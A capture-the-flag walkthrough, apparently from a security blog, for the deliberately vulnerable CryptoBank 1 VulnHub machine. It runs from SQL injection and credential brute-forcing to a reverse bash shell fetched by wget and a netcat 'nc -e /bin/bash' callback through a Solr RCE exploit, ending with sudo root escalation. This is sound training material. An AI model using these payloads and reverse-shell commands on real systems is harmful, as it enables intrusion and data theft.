<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">CryptoBank: 1: Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/cryptobank-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-09-15T11:09:39+00:00">September 15, 2020</time><time class="updated" datetime="2025-07-14T18:36:18+00:00">July 14, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to crack this vulnerable virtual machine called CryptoBank 1. It was created by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/emaragkos">emaragkos</a></strong></span>. This challenge is a variation of Capture the Flag. After obtaining root level privileges on the computer, it comprises a single flag. This machine belonged to the intermediate level. I was forced to consider it and work on it several times. This is one instance where enumeration is essential. Rooting this machine is impossible without accurate enumeration.</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Penetration Testing Methodology</span> </span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service at port 80</span></li>
<li><span style="color: #000000;">Generation of User Dictionary</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Exploitation of Time-Based SQL Injection</span></li>
<li><span style="color: #000000;">Enumeration of various Credentials</span></li>
<li><span style="color: #000000;">Directory Bruteforce using Dirb</span></li>
<li><span style="color: #000000;">Dictionary attack using Hydra</span></li>
<li><span style="color: #000000;">Directory Bruteforce using Dirb</span></li>
<li><span style="color: #000000;">Enumerating Git</span></li>
<li><span style="color: #000000;">Crafting Reverse Bash payload</span></li>
<li><span style="color: #000000;">Exploitation of Command Injection</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Post Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Enumeration of services and connections using netstat</span></li>
<li><span style="color: #000000;">Forwarding Port using portfwd</span></li>
<li><span style="color: #000000;">Enumerating Version of Solr</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Exploiting Solr RCE Vulnerability</span></li>
<li><span style="color: #000000;">Escalating Privileges using Sudo Permissions.</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Reading Root Flag</strong></span></li>
</ul>
<h3><span style="color: #800000;">Walkthrough</span></h3>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">To Attack any machine, we need to find the IP Address of the machine. This can be done using the netdiscover command. To find the IP Address, we need to co-relate the MAC Address of the machine that can be obtained from the Virtual Machine Configuration Setting. The IP Address of the machine was found to be 192.168.1.105. </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jhIh7YbBb-s/X2CU7J4GpJI/AAAAAAAAobc/W3sJkDy-aZUEQ1FefP8kpVSw-HOVS7VZgCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Following the netdiscover, we need a nmap scan to get the information about the services running on the virtual machine. A simple nmap scan reveals that 2 services: SSH (22) and HTTP (80) are running on the application.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 192.168.1.105</pre>
<h3><span style="color: #000000;"><span style="color: #800000;">Enumeration</span></span></h3>
<p><span style="color: #000000;">Since we have the HTTP service running on the virtual machine, let’s take a look at the webpage hosted.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.1.105</pre>
<p><span style="color: #000000;">There was a Secure Login button on the top right-hand side of the webpage. It was not working as intended. It was trying to access http://cryptobank.local/trade. This means we need to make some changes in /etc/hosts. We thought we will get back to it later. Moving down and inspecting different links, we got to the CORE TEAM section. It contained the names of employees with their social links.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cRiOYW21-mM/X2CVFQzG8hI/AAAAAAAAobg/Our4LRajtPMBLCBFYrJF1g0xOO7_CjUaACLcBGAsYHQ/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Upon clicking the Email Icon under the Employee’s Profile, we see that it is trying to access the location of the page associated with the name of the employee. These might be potential usernames.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8Gdr1FCH0qg/X2CVLsmGO8I/AAAAAAAAobo/Btq_hvIsRkUgmXnhTNFw_ZYODo1yqPn9QCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Hence, we created a dictionary from those usernames as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F9Yevn4AMZk/X2CVTLiIwAI/AAAAAAAAobs/PhEYYn9Ykts8wsKmJVMFoxbzLN7S1p4rACLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Earlier we tried to access the Secure Login section but we were unable to do it. To access the page, we need to add “cryptobank.local” into the /etc/hosts file as shown below:</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-fECBetH_Ew8/X2CVYWR-vdI/AAAAAAAAob0/pTyopbWXjgAuPUbOeWV9s6K6sY2f_iTXgCLcBGAsYHQ/s1600/5.png"/></p>
<h3><span style="color: #800000;">Exploitation</span></h3>
<p><span style="color: #000000;">We tried to access the page again. This time we were successful in getting a webpage. It says “Secure Login”, let’s test how secure is it? Firstly, we tried to go for SQL Injection. For that, we need to capture a request on the Login button of the form. We used the Burp Suite for this activity.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2S7G_EDdF14/X2CV_IQKGJI/AAAAAAAAocY/tm6BwUiRLEwDEDn1nbmnjrLM2VqKWqf1QCLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">We copy the request to a text file and name it req.txt. Now, to enumerate for SQL Injection, we will be using sqlmap. Initially, we start with some basic options such as dbs and batch for ease.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r req.txt --dbs --batch</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-CxMV_Tqa_GA/X2CWEa5BLoI/AAAAAAAAocc/_VDxKKajqI0Cj7y1CD1u9-QHoSX50zeOQCLcBGAsYHQ/s1600/8.png"/></strong></span></p>
<p><span style="color: #000000;">It was a Time-Based SQL Injection; hence it takes some significant amount of time for extracting the data. It gave us 5 databases. Among them, the cryptobank database seems important.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wR3xS43Dj6M/X2CWKfeqQVI/AAAAAAAAocg/GuZdIDQqxnw8ZZiXRS6epIXUlX6SYNQnQCLcBGAsYHQ/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Now that we have a Database we want to target, let’s run the sqlmap again. This time we will use the -D option to provide the target database and –tables to extract the tables inside that database.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r req.txt --dbs -D cryptobank --tables --batch</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y_ajT2qEgIM/X2CWQa-MtNI/AAAAAAAAock/cDr9swkd-oIGLbL3B47x0wY0ax5AOyIOgCLcBGAsYHQ/s1600/10.png"/></span></p>
<p><span style="color: #000000;">After taking its sweet time, sqlmap gave us 3 tables: comments, accounts, loans. Among these accounts seems more interesting.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PWibOBkCeBM/X2CWYK82RyI/AAAAAAAAocs/-WMtGm4ApVMNm8-5qVNxdeE7Kk_Ez_aIQCLcBGAsYHQ/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Time to extract entries from the accounts table. For this we will sue the -T option as shown in the image below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r req.txt --dbs -D cryptobank -T accounts --dump --batch</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qGkzDFtv_5g/X2CWegbyzvI/AAAAAAAAoc0/6k6o4V6nQjw5HHkWD8XGTEPu0bPPQqlpwCLcBGAsYHQ/s1600/12.png"/></span></p>
<p><span style="color: #000000;">We got 12 entries with some bizarre balance. What kind of trading are these people doing anyway?</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kDqcSLLzm-s/X2CXKFVPSqI/AAAAAAAAodE/jRdCTW9-OPcYA1QGCrqI14bDfEh8dSvQQCLcBGAsYHQ/s1600/13.png"/></span></p>
<h4><span style="color: #800000;">Directory Bruteforce</span></h4>
<p><span style="color: #000000;">We thought that there might be some URLs that we haven’t yet enumerated. As we didn’t browse the website after we added its entry in /etc/hosts. For this, we decided to use the dirb tool.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://cryptobank.local/</pre>
<p><span style="color: #000000;">It gave us /development directory. Upon browsing this directory, we were welcomed by a login form. As we already have some usernames and passwords from the databases. Its time to put those to use. Hydra is a great tool in such situations where we have a login form like this. Hydra took no time in getting the correct set of credentials to log in.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -L users.txt -P pass.txt cryptobank.local -f http-get /development</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-g6Xat-azb2s/X2CXRU0kqYI/AAAAAAAAodI/7PcoMv1p2Rwsy6KRPT81PATLs8fOvgqlgCLcBGAsYHQ/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Time to enter these credentials in the login form:</span></p>
<p><span style="color: #000000;"><strong>Username: julius.b</strong> [Extracted from the Email link on Home Page]</span></p>
<p><span style="color: #000000;"><strong>Password: wJWm4CgV26</strong> [Extracted from the Database using SQL Injection]</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-frMQrDXz8s8/X2CXYQOCSfI/AAAAAAAAodM/ZpTT5Hr5HsMKKhgQfmjXxU8iRBlpxhBmgCLcBGAsYHQ/s1600/15.png"/></span></p>
<p><span style="color: #000000;">After logging, we get a message “only for development”. That’s a bummer. As we were about to give in and trying to find another method to get into the virtual machine, we remembered that we can try directory bruteforce in /development. For those who don’t know, we can provide credentials in directory bruteforce using the -u parameter as shown in the image below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://cryptobank.local/development/ -u julius.b:wJWm4CgV26</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oppuVOrcM4w/X2CXoxcE1mI/AAAAAAAAodg/zCxZiW5jefIpQpnD79Fr2WH-1iYFsyArQCLcBGAsYHQ/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Directory Bruteforce gave us 2 new directories: /development/tools/ and /development/backups/.</span></p>
<p><span style="color: #000000;">Let’s take a look into backups first.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-60PEAIlulVU/X2CXvQ1Wd2I/AAAAAAAAodk/ejvK8wVqiPELxd7tStC9KlBTAA9pXcj0ACLcBGAsYHQ/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Upon close inspection, it contains a copy of the website that we found initially.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YdzMoPRgN7M/X2CX5sGfs1I/AAAAAAAAodw/2Jfpfpq1p3E6r79tomcY4R3Xy_niH9H4ACLcBGAsYHQ/s1600/19.png"/></span></p>
<p><span style="color: #000000;">From the last directory bruteforce, we had to try it again. This time, we brute-forced the /backups/home/ directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://cryptobank.local/development/backups/home/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-csIcC2o5xyI/X2CYESXFZKI/AAAAAAAAod4/VdylLTfCgJYKxp1c8lH6NTOPuAIRXrgSQCLcBGAsYHQ/s1600/25.png"/></span></p>
<h4><span style="color: #800000;">Enumerating Git</span></h4>
<p><span style="color: #000000;">We find some hidden directories inside the /backups/home/ directory. We got /.git/. This means that the development was supported using multiple branches as in Git. To move around and took a closer look, let’s get those files onto our local system. There are a bunch of tools on the web that do that. We will be suing the GitHack for now. It is easy to use. Just clone the toll from GitHub. Move into the cloned directory and give proper execution permissions to the python file and run the tool with the .git directory as a parameter as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9NJO3FwmH1Y/X2CYM81u0ZI/AAAAAAAAoeA/2I3Ycrl5n682x1t8cbFRICsl1J7fHI23wCLcBGAsYHQ/s1600/26.png"/></span></p>
<p><span style="color: #000000;">After working a while, a directory is created by the name of the domain i.e., cryptobank.local/. We take a look into it and we see that there is a tool directory and inside it, we found a directory named CommandExecution. That’s worth looking into. We see that there is a php file. After taking a closer look we see that there is a password associated with the command execution. It is wJWm4CgV26. The same password that we cracked earlier.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F2vf1X81Tks/X2CYWNJyXpI/AAAAAAAAoeI/R3KePY5ZaBoy-JdDwfeodCe8kjfWHJz3gCLcBGAsYHQ/s1600/27.png"/></span></p>
<h4><span style="color: #800000;">Crafting Reverse Bash payload</span></h4>
<p><span style="color: #000000;">Time to execute some commands. We browse the webpage on the Web Browser. We see that it has 3 tools. There must be multiple ways to exploit this virtual machine. But since we can execute the commands directly, we will use this method.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pxSYWK5mqkE/X2CYhvF5_fI/AAAAAAAAoeQ/fK_M4BJJhKgv0luivxumMfz2SreWUdWFwCLcBGAsYHQ/s1600/28.png"/></span></p>
<p><span style="color: #000000;">Here we have an option to Run system command. We choose this option and move forward.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-suAtaGwQNFo/X2CY4TGbH8I/AAAAAAAAoec/ne6yYJuWPhw7S_fd2BXLf-1ZVEr4aQkLgCLcBGAsYHQ/s1600/29.png"/></span></p>
<p><span style="color: #000000;">Before taking any measures, we should check if this method is working properly or not. So, we enter the command in the username field and password in the password field.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7F77es7VsX8/X2CZEMg1ZCI/AAAAAAAAoeg/HR1jR5-dhBoL_US3BUg9I_LvLQqA703KgCLcBGAsYHQ/s1600/30.png"/></span></p>
<p><span style="color: #000000;">There we have it the result of the id command. The command injection is working. Time to exploit this vulnerability and get ourselves a session.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rvXPDDBWI-Y/X2CZKyeFAMI/AAAAAAAAoek/znEURqJGe1Ez5mck3mSB-BH_PDM0LrM3gCLcBGAsYHQ/s1600/31.png"/></span></p>
<p><span style="color: #000000;">We used msfvenom to craft a payload. It is a simple reverse_bash payload. We have the command that we need to execute to generate a session. We transfer the command into a shell file and name it revshell.sh. Now we start the python server to transfer the payload to the target virtual machine.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.112 lport=9999 R
echo [payload] &gt; revshell.sh
python -m SimpleHTTPServer</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hwsqaFsxaiY/X2CZSqx_c7I/AAAAAAAAoeo/eu6LAe_k46sAVofgEXOt1dkJvfPHd6_HQCLcBGAsYHQ/s1600/32.png"/></span></p>
<h4><span style="color: #800000;">Exploitation of Command Injection</span></h4>
<p><span style="color: #000000;">Now we use the command injection to upload the file on the virtual machine as shown in the image below.</span></p>
<pre class="lang:default decode:true">wget http://192.168.1.112:8000/revshell.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-N-NxzlpsYOI/X2CZbuA8dTI/AAAAAAAAoe0/KuqMuc4Nk0EIHOfL38krm-qVtD1Ga-5vACLcBGAsYHQ/s1600/33.png"/></span></p>
<p><span style="color: #000000;">Let’s check if we can upload the file. We check using the directory listing command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-o31QhgTcqmk/X2CZiw-HTMI/AAAAAAAAoe8/SVjcFMZopB08w9mRnko4R6r0MUqJsb8WwCLcBGAsYHQ/s1600/34.png"/></span></p>
<p><span style="color: #000000;">Now before executing the file, we need to create a listener to capture the session when it gets executed. We start Metasploit Framework. Use the multi/handler listener. Select the same payload which we used while crafting using msfvenom. Provide the necessary details and entering the exploit command to run the listener.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler set payload cmd/unix/reverse_bash set lhost 192.168.1.112 set lport 9999 exploit</pre>
<p><span style="color: #000000;">Then we go back to the web browser and execute the payload on the virtual machine using the bash command as shown in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bash revshell.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WfI0GpqpjLE/X2CZ_Y6CfFI/AAAAAAAAofQ/IGin1zaXeHMmG_ZA_75TIsb3yP-Nx2yAwCLcBGAsYHQ/s1600/35.png"/></span></p>
<p><span style="color: #000000;">As soon as the command gets executed on the Target Machine, we have the Command shell session opened on the handler we started earlier. We converted the shell into a meterpreter session to gain more control over the virtual machine. After gaining the meterpreter session we ran the netstat to discover any other services or instances running internally on the application. We see that there is an instance running on port 8983. It seems like a docker instance. Let’s enumerate further.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions -u 1 sessions 2 netstat -antp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--FYTRi3IJ38/X2CaJQleCVI/AAAAAAAAofY/ta4f4oThtEgbQUC091I9UhMM6gLlVwWygCLcBGAsYHQ/s1600/36.png"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Post-Exploitation</span> </strong></span></h3>
<p><span style="color: #000000;">To get a proper look at the docker instance, we used the portfwd command to transfer or forward the oncoming traffic from that port onto our local machine i.e., Kali Linux.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">portfwd add -l 8983 -p 8983 -r 172.17.0.1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xa5xqRYPPuk/X2CaRtJTyOI/AAAAAAAAofg/NzHAKsT2BwUYGz4jVz-BU0Vp3uq9gHf8ACLcBGAsYHQ/s1600/37.png"/></span></p>
<p><span style="color: #000000;">Now, let’s take a look at the service that is running on this docker instance. We browse the instance on our Web browser using the following address associated with the port that we forward the traffic to.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://127.0.0.1:8983/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bzLHl_V5v9Y/X2CaXAGhFPI/AAAAAAAAofk/gUXRz-6J-VgkIYAmpjlsr4-jkPuKlUFUQCLcBGAsYHQ/s1600/38.png"/></span></p>
<p><span style="color: #000000;">It’s Apache Solr. The enterprise search platform is open-source. This interface’s age was evident from the first observation. This indicates that the virtual machine’s installed version may be weak. Version 8.1.1 was operating on the computer. It can be seen in the earlier picture. We look for any direct exploit for this version on searchspolit. We were fortunate to have the exploit for remote code execution. As seen in the figure below, we obtain the exploit using searchsploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit solr
searchsploit -m 47572</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9QGoPBAQCJA/X2CadrJG8OI/AAAAAAAAofs/txe8NeheDZg3bkEod0fNNEMl3loQZiuPQCLcBGAsYHQ/s1600/39.png"/></span></p>
<p><span style="color: #000000;">After downloading the exploit, we gave it a read and we found that it has a syntax to execute</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 script.py IP [port[command]]</pre>
<p><span style="color: #000000;">So, we got back to our meterpreter shell, traversed into the /tmp directory as it is the only writable directory. We uploaded the payload into this directory. Then we invoked the command shell from meterpreter. The shell generated was lacking some functionalities so we need to upgrade it to a TTY shell. For this, we used the python one-liner.</span></p>
<p><span style="color: #000000;">Now back at the local system, we need to run a netcat listener to capture the shell that would be generated from the exploit. We ran a netcat listener at 7654 port.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 7654</pre>
<p><span style="color: #000000;">Back to the command shell on the target machine, we created the command that we need to execute the exploit and generate a shell. We used a netcat invoke shell one line for the shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp upload /root/47572.py shell python -c 'import pty; pty.spawn("/bin/bash") python3 46573.py 172.17.0.1 8983 "nc -e /bin/bash 192.168.1.112 7654"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-s0iVWqGO1SI/X2CajOL_UiI/AAAAAAAAof0/lw-v8mRtHQkKCvDnhHh4iBrk6Ya-oImRQCLcBGAsYHQ/s1600/40.png"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Privilege Escalation</span> </strong></span></h3>
<p><span style="color: #000000;">After running the command, we went back to the netcat listener. Here we got ourselves a shell. Again, this shell also lacks some functionalities, so we convert this shell into a TTY shell for proper functioning. We check the sudo permissions as found that we can run all the commands using sudo. We upgraded to root shell using the sudo su command. Then, we tried the solr password as it is the default password that is configured with the solr installation. It worked and we got ourselves a root shell. Time to look for the flag. It was waiting for us in the /root directory. This concludes this machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c 'import pty; pty.spawn("/bin/sh")
sudo -l
sudo su
solr
cd /root
ls
cat flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uwFnwjuz07A/X2CaouAuHhI/AAAAAAAAof4/3assMP7tZx8lniTSUCwI5hNsPEUwtediACLcBGAsYHQ/s1600/41.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
